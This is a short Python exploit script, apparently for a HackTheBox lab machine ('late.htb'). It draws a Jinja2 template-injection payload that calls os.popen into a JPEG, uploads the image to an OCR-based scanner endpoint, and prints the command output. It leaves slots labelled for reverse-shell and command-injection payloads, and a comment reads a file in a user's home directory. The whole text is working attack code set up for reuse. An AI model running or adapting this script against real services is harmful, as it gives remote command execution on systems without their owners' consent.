from PIL import Image, ImageDraw, ImageFont
import requests, html

host = "http://images.late.htb/scanner" # Host here.
 
field_name = "file"  # Fieldname in POST Request.

#cat /home/svc_acc/ghost.txt
reverse_shell = """ """ # Os commands here.

commands = ["""{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('"""+reverse_shell+"""').readlines() }}"""] # Your command injection payloads here.

def newPayload(command, index):
    font = ImageFont.truetype("./CamingoCode-Bold.ttf", 26)
    img = Image. new('RGB', (6000,250), color =(255,255,255, 0))
    imageDraw = ImageDraw.Draw(img)
    imageDraw.text((10, 10), command, fill=(0,0,0, 0), font=font)
    filename = f"exploit_{index}.jpg" 
    img.save(filename)
    return filename 

for index, command in enumerate(commands):
    
    payload_filename = newPayload(command, index)
    payload_file = open(payload_filename, 'rb')
    payload_file = {field_name: payload_file}

    req_response = requests.post(host, files=payload_file) 

    print(f"RESULT FOR: {command}")
    print(html.unescape(req_response.text.replace("<p>","").replace("</p>","")), end="\n\n")

